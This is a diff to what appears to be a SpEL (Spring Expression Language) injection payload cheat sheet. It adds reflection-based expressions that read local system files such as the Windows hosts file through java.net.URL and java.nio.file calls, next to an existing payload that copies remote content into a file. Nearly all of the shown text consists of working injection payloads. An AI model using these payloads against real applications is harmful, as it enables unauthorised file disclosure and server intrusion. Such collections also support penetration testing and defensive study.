@@ -84,7 +84,13 @@ T(java.nio.file.Files).copy(new java.net.URL("http://127.0.0.1:8888/test.txt").o
 
 "".getClass().forName("java.nio.file.Files").getMethod("readAllLines","".getClass().forName("java.nio.file.Path")).invoke(null,"".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
 
+// java.nio.file.Files.readdAllLines(java.net.URI)
 T(java.nio.file.Files).readAllLines("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/System32/drivers/etc/hosts")))
+
+//java.lang.String( (java.net.URL).openStream().readAllByte() )
+"".getClass().forName("java.lang.String").getConstructor("".getClass().forName("[B")).newInstance(new java.net.URL("file:/C:/windows/System32/drivers/etc/hosts").openStream().readAllBytes())
+new java.lang.String(new java.net.URL("file:/C:/windows/System32/drivers/etc/hosts").openStream().readAllBytes())
+
 ```
 ## Read Files (Bytes)
 ```java
